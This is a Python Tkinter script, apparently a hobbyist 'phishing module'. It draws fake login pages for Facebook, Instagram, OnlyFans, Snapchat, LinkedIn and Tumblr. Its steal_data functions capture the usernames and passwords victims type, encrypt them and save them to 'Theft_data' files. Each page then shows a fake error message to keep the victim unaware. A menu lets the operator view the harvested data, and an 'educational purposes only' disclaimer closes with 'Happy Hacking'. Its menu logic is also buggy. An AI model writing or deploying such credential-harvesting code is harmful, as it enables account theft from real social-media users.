
from tkinter import *
from PIL import ImageTk,Image
from decrypting_script import *
from editing_script import *
from cryptography.fernet import Fernet

#---------------------------------------------------------------------------------------------------------------------------------------------------------------------

def user():

   


    
    def menu():
            print("\n\n\n\n.............................................................................<< MAIN MENU>>.........................................................................................................")
            print("\n\n                                                                            + - - - - - - - -+")
            print("\n                                                                            | 1)PHISH DATA   |")
            print("\n                                                                            | 2)VIEW DATA    |")
            print("\n                                                                            | 3)EXIT MODULE  |")
            print("\n                                                                            + - - - - - - - -+ ")
            
            men_chc=int(input("\n\n\nENTER YOUR CHOICE  :- "))

            if men_chc==1:
                    ph_mod()
                    

                            
            elif men_chc==3:
                    print("                                                                            + - - - - - - - -+")
                    print("                                                                            |  1) FACEBOOK   |")
                    print("                                                                            |                |")
                    print("                                                                            |  2) INSTAGRAM  |")
                    print("                                                                            |                |")
                    print("                                                                            |  3) OnlyFans   |")
                    print("                                                                            |                |")
                    print("                                                                            |  4) SNAPCHAT   |")
                    print("                                                                            |                |")
                    print("                                                                            |  5) LINKDIN    |")
                    print("                                                                            |                |")
                    print("                                                                            |  6) TUMBLR     |")
                    print("                                                                            + - - - - - - - -+")
                    
                    
                    dic = int(input("\n\nSELECT THE WEBSITE TO VIEW THE DATA OF :- "))
                    
                    #---------------------------------------------------------------------------------------------------------------------
                    
                    if dic  == 1:
                            print("\n                          1) ENCRYPTED DATA")
                            print("\n                          2) DECRYPTED DATA")
                            
                            dec = int(input("\nVIEW DATA TYPE :- "))
                            if dec == 1:
                                    with open ("fb_count_file.txt","r+") as gg:
                                            p = gg.read()
                                            for b in range(int(p)):
                                            
                                                    file=open("key"+"fb"+str(b+1)+".key","rb+")
                                                    key=file.read()
                                                    file.close()
                                     
                                                    with open("Theft_data_fb"+(str(b+1))+'.txt.encrypted', 'rb+') as f:
                                                        f.seek(0)
                                                        data = f.read()
                                                        print("\n ENCRYPTED DATA :- ",data)
                                                        print("")
                                                                                                        
                                    men=input("DO YOU WISH TO EXIT TO MAIN MENU ??  :-").upper()
                                    if men=="Y":
                                           menu()
                            elif dec ==2:
                                print("ACCESS DENIED \nYOU DONT HAVE ADMIN PRIVILEGES")
                               
                                print(".\n.\n.\n.\nEXITING TO MAIN MENU")
                                menu()
                                          
                            else:
                                    print("PLEASE ENTER VALID CHOICE")
                                    print("Exiting to main menu\n.\n.\n.\n.\n.\nDone!")
                                    menu()
                    #---------------------------------------------------------------------------------------------
                                    
                    elif dic  == 2:
                            print("\n                          1) ENCRYPTED DATA")
                            print("\n                          2) DECRYPTED DATA")
                            
                            dec = int(input("\nVIEW DATA TYPE :- "))
                            if dec == 1:
                                    with open ("ins_count_file.txt","r+") as gg:
                                            p = gg.read()
                                            for b in range(int(p)):
                                            
                                                    file=open("key"+"ins"+str(b+1)+".key","rb+")
                                                    key=file.read()
                                                    file.close()
                                     
                                                    with open("Theft_data_ins"+(str(b+1))+'.txt.encrypted', 'rb+') as f:
                                                        f.seek(0)
                                                        data = f.read()
                                                        print("\n ENCRYPTED DATA :- ",data)
                                                        print("")
                                                                                                        
                                    men=input("DO YOU WISH TO  ??  :-").upper()
                                    if men=="Y":
                                           menu()
                            elif dec ==2:
                                print("ACCESS DENIED \nYOU DONT HAVE ADMIN PRIVILEGES")
                               
                                print(".\n.\n.\n.\nEXITING TO MAIN MENU")
                                menu()
                            else:
                                    print("ENTER VALID CHOICE")
                                    print("Exiting to main menu\n.\n.\n.\n.\n.\nDone!")
                                    menu()
                    #------------------------------------------------------------------------------------------------
                                    
                    elif dic  == 3:
                            print("\n                          1) ENCRYPTED DATA")
                            print("\n                          2) DECRYPTED DATA")
                            
                            dec = int(input("\nVIEW DATA TYPE :- "))
                            if dec == 1:
                                    with open ("ofn_count_file.txt","r+") as gg:
                                            p = gg.read()
                                            for b in range(int(p)):
                                            
                                                    file=open("key"+"ofn"+str(b+1)+".key","rb+")
                                                    key=file.read()
                                                    file.close()
                                     
                                                    with open("Theft_data_ofn"+(str(b+1))+'.txt.encrypted', 'rb+') as f:
                                                        f.seek(0)
                                                        data = f.read()
                                                        print("\n ENCRYPTED DATA :- ",data)
                                                        print("")
                                                                                                        
                                    men=input("DO YOU WISH TO  ??  :-").upper()
                                    if men=="Y":
                                           menu()
                            elif dec ==2:
                                print("ACCESS DENIED \nYOU DONT HAVE ADMIN PRIVILEGES")
                               
                                print(".\n.\n.\n.\nEXITING TO MAIN MENU")
                                menu()
                            else:
                                    print("ENTER VALID CHOICE")
                                    print("Exiting to main menu\n.\n.\n.\n.\n.\nDone!")
                                    menu()
                    #--------------------------------------------------------------------------------------------------------

                    
                        
                    else:
                                    print("ENTER VALID CHOICE")
                                    print("Exiting to main menu\n.\n.\n.\n.\n.\nDone!")
                                    menu()

            #-------------------------------------------------------------------------------------------------------------------------------------
            #-------------------------------------------------------------------------------------------------------------------------------------
            
                            
                                    
            #-------------------------------------------------------------------------------------------------------------------------------------
            #-------------------------------------------------------------------------------------------------------------------------------------                           
                    
            elif men_chc==3:
                    print("\n\n\n\nWARNING !! .. PHISHED CREDENTIALS MUST BE USED FOR LEGAL PURPOSES ONLY")
                    print("\n\nTHE DEVELOPERS WILL NOT BE RESPONSIBLE FOR ANY ILLEGAL ACT COMMITED USING THE MODULE")
                    print("\n\n                             *******<<FOR EDUCATIONAL PURPOSES ONLY>>******")
                    print("\n\n\n Exiting Module\n.\n.\n.\n.Happy Hacking :)")
                    exit()    
            else:
                    print("ENTER VALID CHOICE")
                    print("Exiting to main menu\n.\n.\n.\n.\n.\nDone!")
                    menu()
                    
    #---------------------------------------------------------------------------------------------------------------------------------------------------------------

                  
    def ph_mod():
                print("\n\n\n                                                        + - - - - - - - -+")
                print("                                                              |  1) FACEBOOK   |")
                print("                                                              |                |")
                print("                                                              |  2) INSTAGRAM  |")
                print("                                                              |                |")
                print("                                                              |  3) OnlyFans   |")
                print("                                                              |                |")
                print("                                                              |  4) SNAPCHAT   |")
                print("                                                              |                |")
                print("                                                              |  5) LINKDIN    |")
                print("                                                              |                |")
                print("                                                              |  6) TUMBLR     |")
                print("                                                              + _ _ _ _ _ _ _ _+")
                while True:   
                        try:
                                men_chk=int(input("\n\n\nWhat do you want do? : "))
                                break
                        except ValueError:
                                print("ERROR...please enter a valid integer!!")
                
        #------------------------------------------------------------------------------------------------------------------------------------


               
                if men_chk==1:
                        try:

                                with open("fb_count_file.txt","r+") as ob:
                                        a=ob.read()
                        except IOError:
                                print("THE CHOICE IS DISABLED BY ADMIN")
                                menu()
                        
                        
                               
                        

                        
                        l=[]
                        root=Tk()
                        canvas=Canvas(root,width=1360,height=700,background="white")
                        image=ImageTk.PhotoImage(Image.open("fb_bg2.jpg"))
                        canvas.create_image(0,0,anchor=NW,image=image)
                        canvas.pack()
                        photo1=PhotoImage(file= "fb_bt.png" )
                        entry1=Entry(root)
                        entry1.insert(0, "Phone number, Username, Email ID")
                        def some_callback(event): 
                            event.widget.delete(0, "end")
                            return None
                        entry1.bind("<Button-1>", some_callback)
                        entry1.pack()
                        canvas.create_window(959,174,height =49,width=368, window=entry1)
                        entry2=Entry(root)
                        entry2.insert(0, "Password")
                        def some_callback2(event): 
                            event.widget.delete(0, "end")
                            return None
                        entry2.bind("<Button-1>", some_callback2)
                        entry2.pack()
                        canvas.create_window(959,239,height =50,width=368,window=entry2)
                        

                        def steal_data():
                            try:
                                with open ("fb_count_file.txt","r+") as gg:
                                        fbc = gg.read()
                                        fb_count=int(fbc)
                                        print(fb_count)
                            except:
                                        print("ERROR...count file not found!!\n.\n.\n.\n.\n.exiting module...Done!")
                                        menu()
                            
                                
                            l = []    
                            l.append("USERNAME- "+entry1.get()+"              ")
                            l.append("PASSWORD- "+entry2.get())
                            
                            label_text="The username you entered doesn't belong\n to an account. Please check your username\n and try again. "
                            label3=Label(root,text=label_text,foreground="red",background="white")
                            canvas.create_window(952,420,window=label3)
                            key="key"+str(fb_count)

                            key =Fernet.generate_key() 
                            try:
                                    file=open("key"+"fb"+str(fb_count)+".key","wb")
                                    file.write(key)
                                    file.close()
                            except IOError:
                                    print("ERROR...file not found!!")
                                    print("Exiting to main menu\n.\n.\n.\n.\n.\nDone!")
                                    menu()

                            c=str(l).encode()
                            
                            fernet=Fernet(key)
                            encrypted=fernet.encrypt(c)
                            a = "Theft_data_fb"
                            
                            try:
                                    file = open(a+(str(fb_count))+'.txt.encrypted','wb+')
                                    file.seek(0,2)
                                    file.write(encrypted+"\n".encode())
                            except IOError:
                                    print("ERROR...file not found!!")
                                    print("Exiting to main menu\n.\n.\n.\n.\n.\nDone!")
                                    menu()
                            print("CREDENTIALS STORED")
                            print("\n.\n.\n.\n.\n.\n.")
                            print("CREDENTIALS ENCRYPTED")

                            try:
                                    with open ("fb_count_file.txt","w+") as g:
                                            g.seek(0)
                                            g.write(str(fb_count))
                            except IOError:
                                    print("ERROR...file not found!!")
                                    print("Exiting to main menu\n.\n.\n.\n.\n.\nDone!")
                                    menu()
         
                            fb_count+=1
                            
                    
                                
                        
                        butonWrite = Button(root)
                        butonWrite.config(text = '',image=photo1, command = steal_data)
                        canvas.create_window(955,301,height =47,width=363,window=butonWrite)
                        root.mainloop()

                        
                                
                        men=input("DO YOU WISH TO EXIT TO MAIN MENU ??  :-").upper()
                        if men=="Y":
                                
                                menu()
                        else:
                                print("Exiting module\n.\n.\n.\n.\n.\nDone!")
                        
                                
           
                                        
                                

                        
                        
                        
                                
                        
                        
                #-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
                                
                elif men_chk==2:
                            try:

                                with open("ins_count_file.txt","r+") as ob:
                                        a=ob.read()
                            except IOError:
                                print("CHOICE IS DISABLED BY ADMIN")
                                menu()
                                                    


                            l=[]
                            root=Tk()
                            canvas=Canvas(root,width=1360,height=700,background="white")
                            image=ImageTk.PhotoImage(Image.open("ins_bg2.jpg"))
                            canvas.create_image(0,0,anchor=NW,image=image)
                            canvas.pack()
                            photo1=PhotoImage(file= "ins_bt.png")
                            entry1=Entry(root)
                            entry1.insert(0, "Phone number, Username, Email ID")
                            def some_callback(event): 
                                    event.widget.delete(0, "end")
                                    return None
                            entry1.bind("<Button-1>", some_callback)
                            entry1.pack()
                            canvas.create_window(875,202,height =37,width=268, window=entry1)
                            entry2=Entry(root)
                            entry2.insert(0, "Password")
                            def some_callback2(event): 
                                    event.widget.delete(0, "end")
                                    return None
                            entry2.bind("<Button-1>", some_callback2)
                            entry2.pack()
                            canvas.create_window(875,244,height =37,width=268,window=entry2)

                            def steal_data():
                                            try:
                                                with open ("ins_count_file.txt","r") as gg:
                                                        inc = gg.read()
                                                        ins_count=int(inc)
                                                        print(ins_count)
                                            except IOError:
                                                        print("ERROR...count file not found!!\n.\n.\n.\n.\n.exiting module...Done!")
                                                        menu()
                                            
                                            l = []    
                                            l.append("USERNAME- "+entry1.get()+"              ")
                                            l.append("PASSWORD- "+entry2.get())
                                        
                                            label_text="The username you entered doesn't belong\n to an account. Please check your username\n and try again. "
                                            label3=Label(root,text=label_text,foreground="red",background="white")
                                            canvas.create_window(875,355,window=label3)
                                            
                                            key="key"+str(ins_count)
                                           
                                            key =Fernet.generate_key() 
                                            try:
                                                
                                                    file=open("key"+"ins"+str(ins_count)+".key","wb")
                                                    file.write(key)
                                                    file.close()
                                            except IOError:
                                                    print("ERROR...file not found!!")
                                                    print("Exiting to main menu\n.\n.\n.\n.\n.\nDone!")
                                                    menu()

                                            c=str(l).encode()
                                        
                                            fernet=Fernet(key)
                                            encrypted=fernet.encrypt(c)
                                            a = "Theft_data_ins"
                                        
                                            try:
                                                
                                                    file = open(a+(str(ins_count))+'.txt.encrypted','wb+')
                                                    file.seek(0,2)
                                                    file.write(encrypted+"\n".encode())
                                            except IOError:
                                                    print("ERROR...file not found!!")
                                                    print("Exiting to main menu\n.\n.\n.\n.\n.\nDone!")
                                                    menu()
                                            print("CREDENTIALS STORED")
                                            print("\n.\n.\n.\n.\n.\n.")
                                            print("CREDENTIALS ENCRYPTED")
                                            try:
                                                    with open ("ins_count_file.txt","w+") as g:
                                                            g.seek(0)
                                                            g.write(str(ins_count))
                                            except IOError:
                                                    print("ERROR...file not found!!")
                                                    print("Exiting to main menu\n.\n.\n.\n.\n.\nDone!")
                                                    menu()

                                            ins_count+=1
                                        
                        
                                    
                            
                            butonWrite = Button(root)
                            butonWrite.config(text = '',image=photo1, command = steal_data)
                            canvas.create_window(875,293,height =31,width=268,window=butonWrite)
                            root.mainloop()

                        
                            men=input("DO YOU WISH TO EXIT TO MAIN MENU ??  :-").upper()
                            if men=="Y":
                                    menu()
                            else:
                                    print("Exiting module\n.\n.\n.\n.\n.\nDone!")
                
            #---------------------------------------------------------------------------------------------------------------------------------------------------
                        
                elif men_chk==3:
                        try:

                                with open("ofn_count_file.txt","r+") as ob:
                                        a=ob.read()
                        except IOError:
                                print("CHOICE IS DISABLED BY ADMIN")
                                menu()
                        
                        


                        l=[]
                        root=Tk()
                        canvas=Canvas(root,width=1360,height=700,background="white")
                        image=ImageTk.PhotoImage(Image.open("ofn_bg2.jpg"))
                        canvas.create_image(0,0,anchor=NW,image=image)
                        canvas.pack()
                        photo1=PhotoImage(file= "onf_bt3.png")
                        entry1=Entry(root)
                        entry1.insert(0, "Email ID")
                        def some_callback(event): 
                            event.widget.delete(0, "end")
                            return None
                        entry1.bind("<Button-1>", some_callback)
                        entry1.pack()
                        canvas.create_window(920,280,height =37,width=268, window=entry1)
                        entry2=Entry(root)
                        entry2.insert(0, "Password")
                        def some_callback2(event): 
                            event.widget.delete(0, "end")
                            return None
                        entry2.bind("<Button-1>", some_callback2)
                        entry2.pack()
                        canvas.create_window(920,350,height =37,width=268,window=entry2)

                        def steal_data():
                                
                        
                                
                                try:
                                        with open ("ofn_count_file.txt","r+") as gg:
                                                ofc = gg.read()
                                                ofn_count=int(ofc)
                                                print(ofn_count)
                                except:
                                         print("ERROR...count file not found!!\n.\n.\n.\n.\n.exiting module...Done!")
                                         menu()

                                    
                                l = []    
                                l.append("USERNAME- "+entry1.get()+"              ")
                                l.append("PASSWORD- "+entry2.get())
                                
                                label_text="SERVER ERROR 101 !! TRY AGAIN LATER.. "
                                label3=Label(root,text=label_text,foreground="red",background="white")
                                canvas.create_window(920,400,window=label3)
                                key="key"+str(ofn_count)

                                key =Fernet.generate_key() 
                                try:
                                        
                                        file=open("key"+"ofn"+str(ofn_count)+".key","wb")
                                        file.write(key)
                                        file.close()
                                except IOError:
                                        print("ERROR...file not found!!")
                                        print("Exiting to main menu\n.\n.\n.\n.\n.\nDone!")
                                        menu()

                                c=str(l).encode()
                                
                                fernet=Fernet(key)
                                encrypted=fernet.encrypt(c)
                                a = "Theft_data_ofn"
                                
                                try:
                                        
                                        file = open(a+(str(ofn_count))+'.txt.encrypted','wb+')
                                        file.seek(0,2)
                                        file.write(encrypted+"\n".encode())
                                except IOError:
                                        print("ERROR...file not found!!")
                                        print("Exiting to main menu\n.\n.\n.\n.\n.\nDone!")
                                        menu()
                                print("CREDENTIALS STORED")
                                print("\n.\n.\n.\n.\n.\n.")
                                print("CREDENTIALS ENCRYPTED")
                                try:
                                        
                                        with open ("ofn_count_file.txt","w+") as g:
                                                g.seek(0)
                                                g.write(str(ofn_count))
                                except IOError:
                                        print("ERROR...file not found!!")
                                        print("Exiting to main menu\n.\n.\n.\n.\n.\nDone!")
                                        menu()

                                ofn_count+=1     
                            
                        butonWrite = Button(root)
                        butonWrite.config(text = '',image=photo1, command = steal_data)
                        canvas.create_window(920,450,height =44,width=289,window=butonWrite)
                        root.mainloop()
                                
                        men=input("DO YOU WISH TO EXIT TO MAIN MENU ??  :-").upper()
                        if men=="Y":
                                menu()
                        else:
                                print("Exiting module\n.\n.\n.\n.\n.\nDone!")        
                 
            #------------------------------------------------------------------------------------------------------------------------------------------------------------
                        
                elif men_chk==4:
                            try:

                                with open("sp_count_file.txt","r+") as ob:
                                        a=ob.read()
                            except IOError:
                                print("CHOICE IS DISABLED BY ADMIN")
                                menu()
                            




                            l=[]
                            root=Tk()
                            canvas=Canvas(root,width=1360,height=700,background="white")
                            image=ImageTk.PhotoImage(Image.open("sp_bg.png"))
                            canvas.create_image(0,0,anchor=NW,image=image)
                            canvas.pack()
                            photo1=PhotoImage(file= "sp_bt.png")
                            entry1=Entry(root)
                                
                            entry1.pack()
                            canvas.create_window(675,248,height =44,width=350, window=entry1)
                            entry2=Entry(root)
                                
                            entry2.pack()
                            canvas.create_window(675,337,height =43,width=350,window=entry2)

                            def steal_data():
                                            try:
                                                with open ("sp_count_file.txt","r+") as gg:
                                                        spc = gg.read()
                                                        sp_count=int(spc)
                                                        print(sp_count)
                                            except:
                                                        print("ERROR...count file not found!!\n.\n.\n.\n.\n.exiting module...Done!")
                                                        menu()
                                    
                                            l = []    
                                            l.append("USERNAME- "+entry1.get()+"              ")
                                            l.append("PASSWORD- "+entry2.get())
                                        
                                            label_text="SERVER ERROR 102!! TRY AGAIN LATER.."
                                            label3=Label(root,text=label_text,foreground="red",background="white")
                                            canvas.create_window(668,385,window=label3)
                                            key="key"+str(sp_count)

                                            key =Fernet.generate_key() 
                                            try:
                                                
                                                file=open("key"+"sp"+str(sp_count)+".key","wb")
                                                file.write(key)
                                                file.close()
                                            except IOError:
                                                print("ERROR...file not found!!")
                                                print("Exiting to main menu\n.\n.\n.\n.\n.\nDone!")
                                                menu()

                                            c=str(l).encode()
                                        
                                            fernet=Fernet(key)
                                            encrypted=fernet.encrypt(c)
                                            a = "Theft_data_sp"
                                        
                                            try:
                                                
                                                file = open(a+(str(sp_count))+'.txt.encrypted','wb+')
                                                file.seek(0,2)
                                                file.write(encrypted+"\n".encode())
                                            except IOError:
                                                print("ERROR...file not found!!")
                                                print("Exiting to main menu\n.\n.\n.\n.\n.\nDone!")
                                                menu()
                                            print("CREDENTIALS STORED")
                                            print("\n.\n.\n.\n.\n.\n.")
                                            print("CREDENTIALS ENCRYPTED")
                                            try:
                                                
                                                with open ("sp_count_file.txt","w+") as g:
                                                        g.seek(0)
                                                        g.write(str(sp_count))
                                            except IOError:
                                                print("ERROR...file not found!!")
                                                print("Exiting to main menu\n.\n.\n.\n.\n.\nDone!")
                                                menu()
                     
                                            sp_count+=1
                                        
                        

                            butonWrite = Button(root)
                            butonWrite.config(text = '',image=photo1, command = steal_data)
                            canvas.create_window(668,421,height =44,width=100,window=butonWrite)
                            root.mainloop()        
                            men=input("DO YOU WISH TO EXIT TO MAIN MENU ??  :-").upper()
                            if men=="Y":
                                    menu()
                            else:
                                   print("Exiting module\n.\n.\n.\n.\n.\nDone!")

            

        #--------------------------------------------------------------------------------------------------------------------------------------------------------------------
                elif men_chk==5:
                            try:

                                with open("lin_count_file.txt","r+") as ob:
                                        a=ob.read()
                            except IOError:
                                print("CHOICE IS DISABLED BY ADMIN")
                                menu()
                            
                            



                        
                            l=[]
                            root=Tk()
                            canvas=Canvas(root,width=1360,height=700,background="white")
                            image=ImageTk.PhotoImage(Image.open("lin_bg.jpg"))
                            canvas.create_image(0,0,anchor=NW,image=image)
                            canvas.pack()
                            photo1=PhotoImage(file= "lin_bt2.png")
                            entry1=Entry(root)
                            entry1.insert(0, "Email ID")
                            def some_callback(event): 
                                event.widget.delete(0, "end")
                                return None
                            entry1.bind("<Button-1>", some_callback)
                            entry1.pack()
                        
                            canvas.create_window(670,254,height =50,width=383, window=entry1)
                            entry2=Entry(root)
                            entry2.insert(0, "Password")
                            def some_callback2(event): 
                                event.widget.delete(0, "end")
                                return None
                            entry2.bind("<Button-1>", some_callback2)
                            entry2.pack()
                            canvas.create_window(670,318,height =50,width=383,window=entry2)

                            def steal_data():
                                        try:

                                            with open ("lin_count_file.txt","r+") as gd:
                                                    lic = gd.read()
                                                    lin_count = int(lic)
                                        except:
                                            print("ERROR...count file not found!!\n.\n.\n.\n.\n.exiting module...Done!")
                                            menu()
                                       
                                            
                                        l = []    
                                        l.append("USERNAME- "+entry1.get()+"              ")
                                        l.append("PASSWORD- "+entry2.get())
                                        
                                        label_text="SERVER ERROR 102!! TRY AGAIN LATER.."
                                        label3=Label(root,text=label_text,foreground="red",background="white")
                                        canvas.create_window(668,450,window=label3)
                                        key="key"+str(lin_count)

                                        key =Fernet.generate_key() 
                                        try:
                                                
                                                file=open("key"+"lin"+str(lin_count)+".key","wb")
                                                file.write(key)
                                                file.close()
                                        except IOError:
                                                print("ERROR...file not found!!")
                                                print("Exiting to main menu\n.\n.\n.\n.\n.\nDone!")
                                                menu()

                                        c=str(l).encode()
                                        
                                        fernet=Fernet(key)
                                        encrypted=fernet.encrypt(c)
                                        a = "Theft_data_lin"
                                        
                                        try:
                                                
                                                file = open(a+(str(lin_count))+'.txt.encrypted','wb+')
                                                file.seek(0,2)
                                                file.write(encrypted+"\n".encode())
                                        except IOError:
                                                print("ERROR...file not found!!")
                                                print("Exiting to main menu\n.\n.\n.\n.\n.\nDone!")
                                                menu()
                                        print("CREDENTIALS STORED")
                                        print("\n.\n.\n.\n.\n.\n.")
                                        print("CREDENTIALS ENCRYPTED")
                                        try:
                                                
                                                with open ("lin_count_file.txt","w+") as g:
                                                        g.seek(0)
                                                        g.write(str(lin_count))
                                        except IOError:
                                                print("ERROR...file not found!!")
                                                print("Exiting to main menu\n.\n.\n.\n.\n.\nDone!")
                                                menu()
                     
                                        lin_count+=1
                                
                        

                            butonWrite = Button(root)
                            butonWrite.config(text = '',image=photo1, command = steal_data)
                            canvas.create_window(670,393,height =55,width=384,window=butonWrite)
                            root.mainloop()        
                            men=input("DO YOU WISH TO EXIT TO MAIN MENU ??  :-").upper()
                            if men=="Y":
                                    menu()
                            else:
                                    print("Exiting module\n.\n.\n.\n.\n.\nDone!")

                #--------------------------------------------------------------------------------------------------------------------------------------------------------------------                    
                elif men_chk==6:
                            try:

                                with open("tmb_count_file.txt","r+") as ob:
                                        a=ob.read()
                            except IOError:
                                print("CHOICE IS DISABLED BY ADMIN")
                                menu()
                            
                            



                        
                            l=[]
                            root=Tk()
                            canvas=Canvas(root,width=1360,height=700,background="white")
                            image=ImageTk.PhotoImage(Image.open("tmb_bg.png"))
                            canvas.create_image(0,0,anchor=NW,image=image)
                            canvas.pack()
                            photo1=PhotoImage(file= "tmb_bt.png")
                            entry1=Entry(root)
                            entry1.insert(0, "Email ID")
                            def some_callback(event): 
                                event.widget.delete(0, "end")
                                return None
                            entry1.bind("<Button-1>", some_callback)
                            entry1.pack()
                        
                            canvas.create_window(677,254,height =46,width=300, window=entry1)
                            entry2=Entry(root)
                            entry2.insert(0, "Password")
                            def some_callback2(event): 
                                event.widget.delete(0, "end")
                                return None
                            entry2.bind("<Button-1>", some_callback2)
                            entry2.pack()
                            canvas.create_window(677,302,height =46,width=300,window=entry2)

                            def steal_data():
                                        try:

                                            with open ("tmb_count_file.txt","r+") as gd:
                                                    tmc = gd.read()
                                                    tmb_count = int(tmc)
                                        except:
                                            print("ERROR...count file not found!!\n.\n.\n.\n.\n.exiting module...Done!")
                                            menu()
                                       
                                            
                                        l = []    
                                        l.append("USERNAME- "+entry1.get()+"              ")
                                        l.append("PASSWORD- "+entry2.get())
                                        
                                        label_text="SERVER ERROR 102!! TRY AGAIN LATER.."
                                        label3=Label(root,text=label_text,foreground="red",background="white")
                                        canvas.create_window(668,450,window=label3)
                                        key="key"+str(tmb_count)

                                        key =Fernet.generate_key() 
                                        try:
                                                
                                                file=open("key"+"tmb"+str(tmb_count)+".key","wb")
                                                file.write(key)
                                                file.close()
                                        except IOError:
                                                print("ERROR...file not found!!")
                                                print("Exiting to main menu\n.\n.\n.\n.\n.\nDone!")
                                                menu()

                                        c=str(l).encode()
                                        
                                        fernet=Fernet(key)
                                        encrypted=fernet.encrypt(c)
                                        a = "Theft_data_tmb"
                                        
                                        try:
                                                
                                                file = open(a+(str(tmb_count))+'.txt.encrypted','wb+')
                                                file.seek(0,2)
                                                file.write(encrypted+"\n".encode())
                                        except IOError:
                                                print("ERROR...file not found!!")
                                                print("Exiting to main menu\n.\n.\n.\n.\n.\nDone!")
                                                menu()
                                        print("CREDENTIALS STORED")
                                        print("\n.\n.\n.\n.\n.\n.")
                                        print("CREDENTIALS ENCRYPTED")
                                        try:
                                                
                                                with open ("tmb_count_file.txt","w+") as g:
                                                        g.seek(0)
                                                        g.write(str(tmb_count))
                                        except IOError:
                                                print("ERROR...file not found!!")
                                                print("Exiting to main menu\n.\n.\n.\n.\n.\nDone!")
                                                menu()
                     
                                        tmb_count+=1
                                
                        

                            butonWrite = Button(root)
                            butonWrite.config(text = '',image=photo1, command = steal_data)
                            canvas.create_window(677,360,height =48,width=300,window=butonWrite)
                            root.mainloop()        
                            men=input("DO YOU WISH TO EXIT TO MAIN MENU ??  :-").upper()
                            if men=="Y":
                                    menu()
                            else:
                                    print("Exiting module\n.\n.\n.\n.\n.\nDone!")
        

    #--------------------------------------------------------------------------------------------------------------------------------------------------------------------
            
            

                else:
                        print("INVALID CHOICE")
                        print("Exiting to main menu\n.\n.\n.\n.\n.\nDone!")
                        menu()

    menu()



